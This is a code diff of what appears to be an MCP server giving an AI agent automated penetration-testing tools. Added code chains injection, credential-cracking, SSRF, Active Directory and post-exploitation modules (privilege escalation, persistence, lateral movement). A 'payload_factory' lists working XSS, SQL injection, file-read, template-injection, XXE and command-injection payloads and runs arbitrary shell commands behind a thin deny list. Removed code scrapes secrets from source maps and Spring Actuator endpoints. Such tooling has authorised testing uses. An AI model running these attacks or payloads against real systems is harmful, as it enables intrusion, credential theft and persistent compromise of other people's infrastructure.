-            results["stack_config"] = orchestrator.adapt_to_stack(target)
-        
-        elif query_type == "decisions":
-            results["decisions"] = pentest_memory.get_decisions(target)
-        
-        elif query_type == "rate_limits":
-            results["rate_limits"] = rate_limit_detector.get_status(target)
-        
-        results["status"] = "success"
-        results["summary"] = f"Memory query '{query_type}' for {target}: {len(str(context))} bytes of context stored"
-        
-    except Exception as e:
-        results["status"] = "error"
-        results["error"] = str(e)
-    
-    trace.command("pentest_memory_query complete", results)
-    return json.dumps(results, indent=2, default=str)
+        finding_types = set(context.get("finding_types", []))
 
+        targeted_tasks = []
+        # Injection testing if web vulns found
+        if ("web_vulns" in finding_types or "directories" in finding_types) and time_left() > 0:
+            targeted_tasks.append({"name": "injection_matrix",
+                                    "coro": injection_matrix(target=target, depth=d,
+                                                              modules="sqli,xss,ssti,cmdi,lfi",
+                                                              timeout=min(300, int(time_left()) // 2)),
+                                    "timeout": min(300, int(time_left()))})
+
+        # Credential attacks if ports found
+        if any(f in finding_types for f in ["open_ports", "smb_shares"]) and time_left() > 0:
+            targeted_tasks.append({"name": "credential_cracker",
+                                    "coro": credential_cracker(target=target, service="auto",
+                                                                timeout=min(300, int(time_left()) // 2)),
+                                    "timeout": min(300, int(time_left()))})
+
+        # SSRF if web detected
+        if ("web_vulns" in finding_types or "ssrf_potential" in finding_types) and time_left() > 0:
+            targeted_tasks.append({"name": "ssrf_hunter",
+                                    "coro": ssrf_hunter(target=target, param="url",
+                                                         depth=d, timeout=min(200, int(time_left()) // 2)),
+                                    "timeout": min(200, int(time_left()))})
+
+        # AD attacks if SMB/LDAP/Kerberos detected
+        if any(f in finding_types for f in ["smb_shares", "netbios", "ldap"]) and time_left() > 0:
+            targeted_tasks.append({"name": "ad_annihilator",
+                                    "coro": ad_annihilator(target=target, domain="auto",
+                                                            depth=d, timeout=min(300, int(time_left()) // 2)),
+                                    "timeout": min(300, int(time_left()))})
+
+        if targeted_tasks:
+            t_results = await parallel_executor.run_parallel(targeted_tasks, max_concurrent=4)
+            results["parallel_executions"] += len(targeted_tasks)
+            for tr in t_results:
+                log_phase(tr["name"], f"status={tr['status']}", parallel=True)
+                kill_chain.advance_phase(target, KillChainPhase.EXPLOITATION, tr["name"],
+                                          [f"targeted_attack:{tr['status']}"])
+
+        # ═══════════════════════════════════════════════════════════════
+        # PHASE 5: POST-EXPLOITATION (if exploitable vulns found)
+        # ═══════════════════════════════════════════════════════════════
+        final_correlation = vuln_correlator.correlate(target)
+        if (final_correlation.get("attack_surface_score", 0) >= 50
+                or final_correlation.get("exploit_chains")
+                or "credentials" in finding_types) and time_left() > 0:
+            post = await post_exploit_ops(target=target, depth=d,
+                                           modules="privesc,persist,lateral",
+                                           timeout=min(300, int(time_left())))
+            log_phase("post_exploit_ops", "Post-exploitation phase executed")
+            kill_chain.advance_phase(target, KillChainPhase.INSTALLATION, "post_exploit_ops",
+                                      ["post_exploitation_attempted"])
+
+        # ═══════════════════════════════════════════════════════════════
+        # PHASE 6: FINAL INTELLIGENCE REPORT
+        # ═══════════════════════════════════════════════════════════════
+        report = await reporting_engine(target=target, report_type="full")
+        report_data = json.loads(report)
+        results["final_report"] = report_data
+
+        # Full intelligence summary
+        final_corr = vuln_correlator.correlate(target)
+        kc_progress = kill_chain.get_progress(target)
+        results["intelligence"] = {
+            "risk_rating": final_corr["risk_rating"],
+            "attack_surface_score": final_corr["attack_surface_score"],
+            "total_vulnerabilities": final_corr["total_vulns"],
+            "severity_breakdown": final_corr["by_severity"],
+            "exploit_chains": final_corr["exploit_chains"],
+            "recommended_attack_path": final_corr["recommended_attack_path"],
+            "mitre_techniques": final_corr["mitre_coverage"],
+            "kill_chain": kc_progress,
+        }
+
+        results["total_duration_s"] = round(time.time() - start_time, 1)
+        results["modules_executed"] = len(results["phases"])
+        results["total_findings"] = pentest_memory.get_context(target)["total_findings"]
+
+        session_manager.complete_execution(execution, results)
+        return json.dumps(results, indent=2, default=str)
+    except Exception as e:
+        session_manager.complete_execution(execution, {"error": str(e)}, "failed")
+        return json.dumps({"error": str(e), "traceback": traceback.format_exc()})
 
 
 # ============================================================================
-# PHASE 2: SMART INFRASTRUCTURE FINGERPRINTING
+# MODULE 20: PAYLOAD FACTORY
 # ============================================================================
 
 @mcp.tool()
-@resolve_references
-async def smart_fingerprint(
-    target: str,
-    deep: bool = True,
-    timeout: int = 180
+async def payload_factory(
+    action: str = "list",
+    target: Optional[str] = None,
+    payload_type: Optional[str] = None,
+    command: Optional[str] = None,
+    timeout: int = 300,
 ) -> str:
-    """
-    Advanced infrastructure fingerprinting that goes beyond headers.
-    Analyzes: error page patterns, timing side-channels, HTTP/2 behavior,
-    TLS certificate details, favicon hashes, source maps, and API structure
-    to determine exact technology stack, versions, and cloud infrastructure.
-    """
-    target = InputValidator.sanitize_target(target)
-    timeout = InputValidator.validate_timeout(timeout, 180)
-    trace, progress, exec_dir = _init_tool_context("smart_fingerprint", target, 8)
-    
-    results = {
-        "target": target,
-        "server": {}, "framework": {}, "language": {},
-        "cloud": {}, "waf": {}, "cdn": {},
-        "tls": {}, "api_structure": {},
-        "error_patterns": {}, "source_maps": [],
-        "favicon_hash": None, "interesting_headers": {},
-        "confidence_scores": {},
-    }
-    
+    """Payload generation & utility tools. Actions: list, generate, execute, wpscan.
+    payload_type: xss|sqli|lfi|ssti|xxe|cmdi|webshell"""
+    execution = session_manager.start_execution("payload_factory", target or "local", {"action": action})
+    results = {"action": action}
     try:
-        import urllib.request, urllib.error, ssl, hashlib, socket
-        
-        base_url = target if target.startswith("http") else f"https://{target}"
-        hostname = base_url.split("//")[1].split("/")[0].split(":")[0]
-        ctx = ssl.create_default_context()
-        ctx.check_hostname = False
-        ctx.verify_mode = ssl.CERT_NONE
-        
-        # Phase 1: TLS Certificate Analysis
-        progress.update("Phase 1: TLS certificate analysis")
-        trace.command(f"smart_fingerprint target={target}")
-        
-        try:
-            tls_ctx = ssl.create_default_context()
-            with socket.create_connection((hostname, 443), timeout=10) as sock:
-                with tls_ctx.wrap_socket(sock, server_hostname=hostname) as ssock:
-                    cert = ssock.getpeercert()
-                    if cert:
-                        results["tls"] = {
-                            "issuer": dict(x[0] for x in cert.get("issuer", [])),
-                            "subject": dict(x[0] for x in cert.get("subject", [])),
-                            "san": [x[1] for x in cert.get("subjectAltName", [])],
-                            "not_after": cert.get("notAfter", ""),
-                            "serial": cert.get("serialNumber", ""),
-                        }
-                        # Cloud detection from certificate
-                        issuer_org = results["tls"]["issuer"].get("organizationName", "").lower()
-                        san_list = str(results["tls"]["san"]).lower()
-                        if "amazon" in issuer_org or "aws" in san_list:
-                            results["cloud"]["provider"] = "aws"
-                            results["cloud"]["evidence"] = "TLS certificate issuer/SAN"
-                        elif "google" in issuer_org or "gcp" in san_list:
-                            results["cloud"]["provider"] = "gcp"
-                        elif "microsoft" in issuer_org or "azure" in san_list:
-                            results["cloud"]["provider"] = "azure"
-                        elif "cloudflare" in issuer_org:
-                            results["cdn"]["provider"] = "cloudflare"
-        except Exception:
-            results["tls"]["error"] = "TLS analysis failed (non-443 or no TLS)"
-        
-        # Phase 2: Deep Header Analysis + Error Page Fingerprinting
-        progress.update("Phase 2: HTTP fingerprinting + error patterns")
-        
-        # Normal request
-        try:
-            req = urllib.request.Request(base_url, method="GET")
-            req.add_header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
-            with urllib.request.urlopen(req, timeout=12, context=ctx) as resp:
-                headers = dict(resp.headers)
-                body = resp.read(16384).decode("utf-8", errors="ignore")
-                
-                # Detailed header analysis
-                for key, val in headers.items():
-                    k_lower = key.lower()
-                    if k_lower in ["server", "x-powered-by", "x-aspnet-version", "x-runtime"]:
-                        results["interesting_headers"][key] = val
-                    elif "x-amz" in k_lower or "x-aws" in k_lower:
-                        results["cloud"]["aws_headers"] = {key: val}
-                        results["cloud"]["provider"] = "aws"
-                    elif "x-goog" in k_lower:
-                        results["cloud"]["gcp_headers"] = {key: val}
-                        results["cloud"]["provider"] = "gcp"
-                    elif "cf-ray" in k_lower or "cf-cache-status" in k_lower:
-                        results["cdn"]["cloudflare"] = {key: val}
-                
-                # Server version extraction
-                server_header = headers.get("Server", "")
-                if server_header:
-                    results["server"]["header"] = server_header
-                    # Version extraction
-                    import re as _re
-                    version_match = _re.search(r'[\d.]+', server_header)
-                    if version_match:
-                        results["server"]["version"] = version_match.group()
-                
-                # Framework detection from body patterns
-                framework_signatures = {
-                    "spring_boot": [r"Whitelabel Error Page", r"actuator", r"spring"],
-                    "django": [r"csrfmiddlewaretoken", r"django", r"__admin__"],
-                    "laravel": [r"laravel_session", r"XSRF-TOKEN.*laravel"],
-                    "rails": [r"X-Request-Id", r"rails", r"turbolinks"],
-                    "express": [r"express", r"x-powered-by.*express"],
-                    "fastapi": [r"fastapi", r"openapi.*3\.0", r'"detail":\['],
-                    "nextjs": [r"__NEXT_DATA__", r"_next/static", r"_next/image"],
-                    "nuxtjs": [r"__nuxt", r"nuxt", r"_nuxt/"],
-                    "wordpress": [r"wp-content", r"wp-includes", r"wordpress"],
-                    "drupal": [r"Drupal", r"drupal.js", r"sites/default"],
-                }
-                
-                for fw, patterns in framework_signatures.items():
-                    for pattern in patterns:
-                        if _re.search(pattern, body, _re.IGNORECASE) or _re.search(pattern, str(headers), _re.IGNORECASE):
-                            results["framework"]["detected"] = fw
-                            results["framework"]["evidence"] = pattern
-                            results["confidence_scores"]["framework"] = "high"
-                            break
-                    if results["framework"].get("detected"):
-                        break
-                
-                # Source map detection
-                source_map_patterns = [
-                    r"//# sourceMappingURL=([^\s\"']+)",
-                    r"/\*# sourceMappingURL=([^\s\"']+)\s*\*/",
-                ]
-                for pattern in source_map_patterns:
-                    maps = _re.findall(pattern, body)
-                    results["source_maps"].extend(maps[:5])
-                
-        except urllib.error.HTTPError as e:
-            headers = dict(e.headers) if hasattr(e, 'headers') else {}
-            results["interesting_headers"]["error_status"] = e.code
-        except Exception as e:
-            results["error_patterns"]["main_request"] = str(e)
-        
-        # Phase 3: Error page fingerprinting (trigger 404, 500, etc.)
-        if deep:
-            progress.update("Phase 3: Error page fingerprinting")
-            
-            error_triggers = [
-                ("/thisdoesnotexist_" + str(int(time.time())), "404"),
-                ("/%00", "null_byte"),
-                ("/..%252f..%252f", "path_traversal"),
-                ("/?<script>", "xss_in_param"),
-            ]
-            
-            for path, trigger_type in error_triggers:
+        if action == "list":
+            results["payload_types"] = {
+                "xss": ["reflected", "stored", "dom", "polyglot"],
+                "sqli": ["union", "blind_boolean", "blind_time", "error_based", "stacked"],
+                "lfi": ["traversal", "php_filter", "wrapper", "log_poison"],
+                "ssti": ["jinja2", "twig", "freemarker", "velocity", "thymeleaf"],
+                "xxe": ["file_read", "ssrf", "blind_oob", "parameter_entity"],
+                "cmdi": ["semicolon", "pipe", "backtick", "dollar", "newline"],
+                "webshell": ["php", "asp", "jsp", "python"],
+            }
+        elif action == "generate" and payload_type:
+            payloads = {
+                "xss": ['<script>alert(document.domain)</script>', '"><img src=x onerror=alert(1)>', "<svg onload=alert(1)>", "javascript:alert(1)", '{{constructor.constructor("return this")().alert(1)}}'],
+                "sqli": ["' OR 1=1--", "' UNION SELECT NULL,NULL--", "' AND SLEEP(5)--", "1; WAITFOR DELAY '0:0:5'--", "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--"],
+                "lfi": ["../../../etc/passwd", "....//....//etc/passwd", "php://filter/convert.base64-encode/resource=/etc/passwd", "/proc/self/environ", "expect://id"],
+                "ssti": ["{{7*7}}", "${7*7}", "#{7*7}", "<%= 7*7 %>", "{{config}}", "${T(java.lang.Runtime).getRuntime().exec('id')}"],
+                "xxe": ['<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'],
+                "cmdi": ["; id", "| id", "$(id)", "`id`", "%0a id", "|| id"],
+            }
+            results["payloads"] = payloads.get(payload_type, ["Unknown type"])
+        elif action == "execute" and command:
+            if any(d in command for d in ["rm -rf", "mkfs", "dd if", "shutdown", "> /dev"]):
+                results["error"] = "Dangerous command blocked"
+            else:
+                r = await run_command_shell(command, timeout=InputValidator.validate_timeout(timeout))
+                results["output"] = r.get("stdout", "")[:5000]
+                results["stderr"] = r.get("stderr", "")[:2000]
+                results["success"] = r.get("success", False)
+        elif action == "wpscan" and target:
+            target = InputValidator.sanitize_target(target)
+            wp = await run_command(["wpscan", "--url", target, "--enumerate", "vp,vt,u", "--format", "json", "--random-user-agent"], timeout=timeout)
+            if wp.get("stdout"):
                 try:
-                    err_url = f"{base_url.rstrip('/')}{path}"
-                    req = urllib.request.Request(err_url, method="GET")
-                    req.add_header("User-Agent", "Mozilla/5.0")
-                    try:
-                        with urllib.request.urlopen(req, timeout=8, context=ctx) as resp:
-                            err_body = resp.read(4096).decode("utf-8", errors="ignore")
-                            results["error_patterns"][trigger_type] = {
-                                "status": resp.status, "length": len(err_body)
-                            }
-                    except urllib.error.HTTPError as e:
-                        err_body = e.read(4096).decode("utf-8", errors="ignore") if hasattr(e, 'read') else ""
-                        results["error_patterns"][trigger_type] = {
-                            "status": e.code, "length": len(err_body)
-                        }
-                        # Fingerprint from error page content
-                        if "Whitelabel Error" in err_body:
-                            results["framework"]["detected"] = "spring_boot"
-                            results["framework"]["evidence"] = "Whitelabel Error Page in 404"
-                        elif "nginx" in err_body.lower():
-                            results["server"]["confirmed"] = "nginx"
-                        elif "apache" in err_body.lower():
-                            results["server"]["confirmed"] = "apache"
-                        elif "express" in err_body.lower() or "Cannot GET" in err_body:
-                            results["framework"]["detected"] = "express"
-                            results["framework"]["evidence"] = "Cannot GET pattern"
-                        elif "django" in err_body.lower():
-                            results["framework"]["detected"] = "django"
-                except Exception:
-                    continue
-        
-        # Phase 4: Favicon hash (Shodan-compatible)
-        progress.update("Phase 4: Favicon hash + API structure")
-        try:
-            fav_url = f"{base_url.rstrip('/')}/favicon.ico"
-            req = urllib.request.Request(fav_url)
-            req.add_header("User-Agent", "Mozilla/5.0")
-            with urllib.request.urlopen(req, timeout=8, context=ctx) as resp:
-                if resp.status == 200:
-                    fav_data = resp.read(65536)
-                    import base64
-                    fav_b64 = base64.encodebytes(fav_data).decode()
-                    results["favicon_hash"] = hashlib.md5(fav_b64.encode()).hexdigest()
-        except Exception:
-            pass
-        
-        # Phase 5: API structure probing
-        api_endpoints = ["/api", "/v1", "/v2", "/graphql", "/rest", "/swagger-ui.html", "/docs", "/redoc"]
-        api_found = []
-        for ep in api_endpoints:
-            try:
-                api_url = f"{base_url.rstrip('/')}{ep}"
-                req = urllib.request.Request(api_url, method="GET")
-                req.add_header("User-Agent", "Mozilla/5.0")
-                req.add_header("Accept", "application/json")
-                try:
-                    with urllib.request.urlopen(req, timeout=6, context=ctx) as resp:
-                        if resp.status in [200, 301, 302]:
-                            api_found.append({"endpoint": ep, "status": resp.status})
-                except urllib.error.HTTPError as e:
-                    if e.code in [401, 403, 405, 422]:
-                        api_found.append({"endpoint": ep, "status": e.code, "exists": True})
-            except Exception:
-                continue
-        
-        results["api_structure"]["endpoints_found"] = api_found
-        
-        # Store in memory
-        if results["framework"].get("detected"):
-            pentest_memory.store_finding(target, "smart_fingerprint", "stack", 
-                                         {"framework": results["framework"]["detected"]})
-        if results["cloud"].get("provider"):
-            pentest_memory.store_finding(target, "smart_fingerprint", "cloud", results["cloud"])
-        if results["server"].get("header"):
-            pentest_memory.store_finding(target, "smart_fingerprint", "stack",
-                                         {"server": results["server"]["header"]})
-        
-        results["status"] = "success"
-        results["summary"] = (
-            f"Smart fingerprint complete. "
-            f"Server: {results['server']}. "
-            f"Framework: {results['framework']}. "
-            f"Cloud: {results['cloud']}. "
-            f"CDN: {results['cdn']}. "
-            f"Source maps: {len(results['source_maps'])}. "
-            f"API endpoints: {len(api_found)}."
-        )
-        
+                    results["wpscan"] = json.loads(wp["stdout"])
+                except json.JSONDecodeError:
+                    results["wpscan"] = {"raw": wp["stdout"][:3000]}
+            else:
+                results["wpscan"] = {"error": wp.get("stderr", "")[:1000]}
+        session_manager.complete_execution(execution, results)
+        return json.dumps(results, indent=2, default=str)
     except Exception as e:
-        results["status"] = "error"
-        results["error"] = str(e)
-    
-    trace.command("smart_fingerprint complete", results)
-    return json.dumps(results, indent=2, default=str)
+        session_manager.complete_execution(execution, {"error": str(e)}, "failed")
+        return json.dumps({"error": str(e), "traceback": traceback.format_exc()})
 
 
-@mcp.tool()
-@resolve_references
-async def source_map_extractor(
-    target: str,
-    custom_paths: str = "",
-    timeout: int = 120
-) -> str:
-    """
-    Discovers and analyzes JavaScript source maps to extract:
-    - Original source file paths (reveals internal structure)
-    - API endpoint URLs hardcoded in frontend
-    - Internal hostnames and service names
-    - Environment variables and config
-    - Authentication patterns and secrets
-    
-    Source maps are often left accessible in production and reveal the entire
-    frontend codebase structure.
-    """
-    target = InputValidator.sanitize_target(target)
-    timeout = InputValidator.validate_timeout(timeout, 120)
-    trace, progress, exec_dir = _init_tool_context("source_map_extractor", target, 6)
-    
-    results = {
-        "target": target,
-        "source_maps_found": [],
-        "source_files_revealed": [],
-        "api_endpoints_extracted": [],
-        "internal_hosts": [],
-        "secrets_patterns": [],
-        "environment_hints": [],
-    }
-    
-    try:
-        import urllib.request, urllib.error, ssl
-        import re as _re
-        
-        base_url = target if target.startswith("http") else f"https://{target}"
-        ctx = ssl.create_default_context()
-        ctx.check_hostname = False
-        ctx.verify_mode = ssl.CERT_NONE
-        
-        progress.update("Phase 1: Discovering JS files and source map references")
-        trace.command(f"source_map_extractor target={target}")
-        
-        # Step 1: Get main page and find JS files
-        js_files = []
-        source_map_urls = []
-        
-        try:
-            req = urllib.request.Request(base_url, method="GET")
-            req.add_header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
-            with urllib.request.urlopen(req, timeout=15, context=ctx) as resp:
-                body = resp.read(65536).decode("utf-8", errors="ignore")
-                
-                # Find JS file references
-                js_patterns = _re.findall(r"(?:src|href)=[\"']([^\"']*\.js(?:\?[^\"']*)?)[\"']", body)
-                js_files.extend(js_patterns[:20])
-                
-                # Direct source map references in HTML
-                map_refs = _re.findall(r'//[#@]\s*sourceMappingURL=([^\s\"\x27]+)', body)
-                source_map_urls.extend(map_refs)
-                
-        except Exception:
-            pass
-        
-        # Add common source map paths
-        common_map_paths = [
-            "/main.js.map", "/app.js.map", "/bundle.js.map",
-            "/vendor.js.map", "/runtime.js.map", "/chunk.js.map",
-            "/_next/static/chunks/main.js.map",
-            "/_next/static/chunks/webpack.js.map",
-            "/static/js/main.chunk.js.map",
-            "/static/js/bundle.js.map",
-        ]
-        
-        if custom_paths:
-            common_map_paths.extend(custom_paths.split(","))
-        
-        # Step 2: Check each JS file for sourceMappingURL
-        progress.update("Phase 2: Checking JS files for source map URLs")
-        
-        for js_path in js_files[:10]:
-            try:
-                if js_path.startswith("http"):
-                    js_url = js_path
-                elif js_path.startswith("//"):
-                    js_url = "https:" + js_path
-                elif js_path.startswith("/"):
-                    js_url = f"{base_url.rstrip('/')}{js_path}"
-                else:
-                    js_url = f"{base_url.rstrip('/')}/{js_path}"
-                
-                req = urllib.request.Request(js_url, method="GET")
-                req.add_header("User-Agent", "Mozilla/5.0")
-                with urllib.request.urlopen(req, timeout=10, context=ctx) as resp:
-                    # Read last 500 bytes (source map URL is at the end)
-                    js_content = resp.read(262144).decode("utf-8", errors="ignore")
-                    map_refs = _re.findall(r'//[#@]\s*sourceMappingURL=([^\s\"\x27]+)', js_content[-500:])
-                    for ref in map_refs:
-                        if ref.startswith("data:"):
-                            continue  # Skip inline maps
-                        if not ref.startswith("http"):
-                            # Relative to JS file
-                            js_dir = "/".join(js_url.split("/")[:-1])
-                            ref = f"{js_dir}/{ref}"
-                        source_map_urls.append(ref)
-                    
-                    # Also extract API endpoints from JS content
-                    api_patterns = _re.findall(r'[\"\x27](/api/[^\"\x27\s]+)[\"\x27]', js_content)
-                    api_patterns += _re.findall(r'[\"\x27]https?://[^\"\x27\s]*?/api/[^\"\x27\s]+[\"\x27]', js_content)
-                    api_patterns += _re.findall(r'fetch\([\"\x27]([^\"\x27]+)[\"\x27]', js_content)
-                    results["api_endpoints_extracted"].extend(list(set(api_patterns))[:20])
-                    
-            except Exception:
-                continue
-        
-        # Step 3: Try to fetch source maps
-        progress.update("Phase 3: Fetching and analyzing source maps")
-        
-        all_map_urls = list(set(source_map_urls + common_map_paths))
-        
-        for map_url in all_map_urls[:15]:
-            try:
-                if not map_url.startswith("http"):
-                    map_url = f"{base_url.rstrip('/')}{map_url}"
-                
-                req = urllib.request.Request(map_url, method="GET")
-                req.add_header("User-Agent", "Mozilla/5.0")
-                with urllib.request.urlopen(req, timeout=10, context=ctx) as resp:
-                    if resp.status == 200:
-                        map_content = resp.read(524288).decode("utf-8", errors="ignore")
-                        
-                        try:
-                            map_data = json.loads(map_content)
-                            sources = map_data.get("sources", [])
-                            
-                            results["source_maps_found"].append({
-                                "url": map_url,
-                                "sources_count": len(sources),
-                                "version": map_data.get("version"),
-                            })
-                            
-                            # Analyze source paths
-                            for src in sources[:50]:
-                                results["source_files_revealed"].append(src)
-                                
-                                # Look for internal hosts
-                                host_match = _re.search(r'https?://([^/\s\"\x27]+)', src)
-                                if host_match:
-                                    results["internal_hosts"].append(host_match.group(1))
-                            
-                            # Search source content for secrets
-                            sources_content = map_data.get("sourcesContent", [])
-                            for sc in sources_content[:10]:
-                                if sc:
-                                    # API keys, tokens, secrets
-                                    secrets = _re.findall(
-                                        r'(?:api[_-]?key|token|secret|password|auth)[\"\s:=]+[\"\x27]([^\"\x27\s]{8,})[\"\x27]',
-                                        sc, _re.IGNORECASE
-                                    )
-                                    for s in secrets[:5]:
-                                        results["secrets_patterns"].append({"pattern": s[:20] + "...", "type": "potential_secret"})
-                                    
-                                    # Environment hints
-                                    env_vars = _re.findall(r'process\.env\.(\w+)', sc)
-                                    results["environment_hints"].extend(env_vars[:10])
-                                    
-                                    # More API endpoints
-                                    apis = _re.findall(r'[\"\x27](/api/[^\"\x27\s]+)[\"\x27]', sc)
-                                    results["api_endpoints_extracted"].extend(apis[:10])
-                                    
-                        except json.JSONDecodeError:
-                            results["source_maps_found"].append({"url": map_url, "error": "invalid JSON"})
-                            
-            except Exception:
-                continue
-        
-        # Deduplicate
-        results["source_files_revealed"] = list(set(results["source_files_revealed"]))[:50]
-        results["api_endpoints_extracted"] = list(set(results["api_endpoints_extracted"]))[:30]
-        results["internal_hosts"] = list(set(results["internal_hosts"]))[:10]
-        results["environment_hints"] = list(set(results["environment_hints"]))[:15]
-        
-        # Store in memory
-        for ep in results["api_endpoints_extracted"]:
-            pentest_memory.store_finding(target, "source_map_extractor", "endpoint", ep)
-        for host in results["internal_hosts"]:
-            pentest_memory.store_finding(target, "source_map_extractor", "technology", f"internal_host:{host}")
-        
-        results["status"] = "success"
-        results["summary"] = (
-            f"Source map analysis complete. "
-            f"Maps found: {len(results['source_maps_found'])}. "
-            f"Source files revealed: {len(results['source_files_revealed'])}. "
-            f"API endpoints extracted: {len(results['api_endpoints_extracted'])}. "
-            f"Internal hosts: {len(results['internal_hosts'])}. "
-            f"Secrets/patterns: {len(results['secrets_patterns'])}."
-        )
-        
-    except Exception as e:
-        results["status"] = "error"
-        results["error"] = str(e)
-    
-    trace.command("source_map_extractor complete", results)
-    return json.dumps(results, indent=2, default=str)
-
-
-@mcp.tool()
-@resolve_references
-async def spring_actuator_exploit(
-    target: str,
-    aggressive: bool = False,
-    timeout: int = 120
-) -> str:
-    """
-    Specialized Spring Boot Actuator exploitation module.
-    Tests all actuator endpoints, extracts environment variables,
-    heap dumps, thread dumps, and mapped endpoints.
-    Finds: credential exposure, internal URLs, database connections.
-    """
-    target = InputValidator.sanitize_target(target)
-    timeout = InputValidator.validate_timeout(timeout, 120)
-    trace, progress, exec_dir = _init_tool_context("spring_actuator_exploit", target, 6)
-    
-    results = {
-        "target": target,
-        "actuator_found": False,
-        "endpoints_accessible": [],
-        "credentials_exposed": [],
-        "internal_urls": [],
-        "environment_vars": {},
-        "mapped_routes": [],
-        "heap_dump_available": False,
-        "severity": "none",
-    }
-    
-    try:
-        import urllib.request, urllib.error, ssl
-        import re as _re
-        
-        base_url = target if target.startswith("http") else f"https://{target}"
-        ctx = ssl.create_default_context()
-        ctx.check_hostname = False
-        ctx.verify_mode = ssl.CERT_NONE
-        
-        progress.update("Testing Spring Boot Actuator endpoints")
-        trace.command(f"spring_actuator_exploit target={target}")
-        
-        # All known actuator endpoints
-        actuator_endpoints = [
-            "/actuator", "/actuator/env", "/actuator/health",
-            "/actuator/info", "/actuator/mappings", "/actuator/beans",
-            "/actuator/configprops", "/actuator/metrics",
-            "/actuator/threaddump", "/actuator/heapdump",
-            "/actuator/loggers", "/actuator/scheduledtasks",
-            "/actuator/httptrace", "/actuator/sessions",
-            "/actuator/shutdown",  # POST only, dangerous
-            # Legacy Spring Boot 1.x paths
-            "/env", "/health", "/info", "/mappings", "/beans",
-            "/configprops", "/metrics", "/trace", "/dump", "/heapdump",
-            # Alternative paths
-            "/manage/health", "/management/health",
-            "/admin/health", "/internal/health",
-        ]
-        
-        for ep in actuator_endpoints:
-            try:
-                url = f"{base_url.rstrip('/')}{ep}"
-                req = urllib.request.Request(url, method="GET")
-                req.add_header("User-Agent", "Mozilla/5.0")
-                req.add_header("Accept", "application/json")
-                
-                try:
-                    with urllib.request.urlopen(req, timeout=8, context=ctx) as resp:
-                        if resp.status == 200:
-                            content = resp.read(65536).decode("utf-8", errors="ignore")
-                            ct = resp.headers.get("Content-Type", "")
-                            
-                            results["actuator_found"] = True
-                            entry = {"endpoint": ep, "status": 200, "content_type": ct}
-                            
-                            # Parse JSON responses
-                            if "json" in ct:
-                                try:
-                                    data = json.loads(content)
-                                    
-                                    # /env → credentials
-                                    if "/env" in ep:
-                                        entry["type"] = "ENVIRONMENT"
-                                        results["severity"] = "CRITICAL"
-                                        # Look for sensitive values
-                                        env_str = json.dumps(data)
-                                        cred_patterns = _re.findall(
-                                            r'"((?:password|secret|key|token|credential)[^"]*)"[:\s]*"([^"]+)"',
-                                            env_str, _re.IGNORECASE
-                                        )
-                                        for key, val in cred_patterns[:10]:
-                                            if val != "******":
-                                                results["credentials_exposed"].append({"key": key, "value": val[:20] + "..."})
-                                        results["environment_vars"] = {str(k): "..." for k in list(data.keys())[:20]} if isinstance(data, dict) else {}
-                                    
-                                    # /mappings → routes
-                                    elif "/mappings" in ep:
-                                        entry["type"] = "ROUTE_MAP"
-                                        if isinstance(data, dict):
-                                            contexts = data.get("contexts", data)
-                                            routes = _re.findall(r'"([A-Z]+\s+/[^"]+)"', json.dumps(contexts))
-                                            results["mapped_routes"] = routes[:30]
-                                    
-                                    # /health → internal services
-                                    elif "/health" in ep:
-                                        entry["type"] = "HEALTH_CHECK"
-                                        health_str = json.dumps(data)
-                                        urls = _re.findall(r'https?://[^\s\"\x27]+', health_str)
-                                        results["internal_urls"].extend(urls[:10])
-                                    
-                                    # /configprops → config
-                                    elif "/configprops" in ep:
-                                        entry["type"] = "CONFIGURATION"
-                                        results["severity"] = max(results["severity"], "HIGH") if results["severity"] != "CRITICAL" else "CRITICAL"
-                                    
-                                except json.JSONDecodeError:
-                                    pass
-                            
-                            # /heapdump → memory dump available
-                            if "/heapdump" in ep:
-                                entry["type"] = "HEAP_DUMP"
-                                results["heap_dump_available"] = True
-                                results["severity"] = "CRITICAL"
-                            
-                            results["endpoints_accessible"].append(entry)
-                            pentest_memory.store_finding(target, "spring_actuator", "endpoint", ep)
-                            
-                except urllib.error.HTTPError as e:
-                    if e.code in [401, 403]:
-                        results["endpoints_accessible"].append({
-                            "endpoint": ep, "status": e.code, "note": "exists but protected"
-                        })
-            except Exception:
-                continue
-        
-        # Store findings in memory
-        if results["actuator_found"]:
-            pentest_memory.store_finding(target, "spring_actuator", "vuln", {
-                "type": "spring_actuator_exposure",
-                "severity": results["severity"],
-                "endpoints": len(results["endpoints_accessible"]),
-            })
-            pentest_memory.store_finding(target, "spring_actuator", "stack", {"framework": "spring_boot"})
-        
-        results["status"] = "success"
-        results["summary"] = (
-            f"Spring Actuator scan complete. "
-            f"Actuator found: {results['actuator_found']}. "
-            f"Accessible endpoints: {len(results['endpoints_accessible'])}. "
-            f"Credentials exposed: {len(results['credentials_exposed'])}. "
-            f"Heap dump available: {results['heap_dump_available']}. "
-            f"Severity: {results['severity']}."
-        )
-        
-    except Exception as e:
-        results["status"] = "error"
-        results["error"] = str(e)
-    
-    trace.command("spring_actuator_exploit complete", results)
-    return json.dumps(results, indent=2, default=str)
-
-
-@mcp.tool()
-@resolve_references
-async def graphql_introspection(
-    target: str,
-    endpoint: str = "/graphql",
-    timeout: int = 120
-) -> str:
-    """
-    Full GraphQL introspection and security testing.
-    Discovers: all types, queries, mutations, subscriptions.
-    Tests: introspection enabled, batch queries, DoS via nested queries,
-    authorization bypass, field-level injection.
-    """
-    target = InputValidator.sanitize_target(target)
-    timeout = InputValidator.validate_timeout(timeout, 120)
-    trace, progress, exec_dir = _init_tool_context("graphql_introspection", target, 6)
-    
-    results = {
-        "target": target, "endpoint": endpoint,
-        "graphql_found": False,
-        "introspection_enabled": False,
-        "types": [], "queries": [], "mutations": [],
-        "security_issues": [],
-        "batch_queries_allowed": False,
-        "depth_limit": None,
-    }
-    
-    try:
-        import urllib.request, urllib.error, ssl
-        
-        base_url = target if target.startswith("http") else f"https://{target}"
-        ctx = ssl.create_default_context()
-        ctx.check_hostname = False
-        ctx.verify_mode = ssl.CERT_NONE
-        
-        progress.update("Testing GraphQL endpoints")
-        trace.command(f"graphql_introspection target={target} endpoint={endpoint}")
-        
-        # Try multiple GraphQL endpoint variants
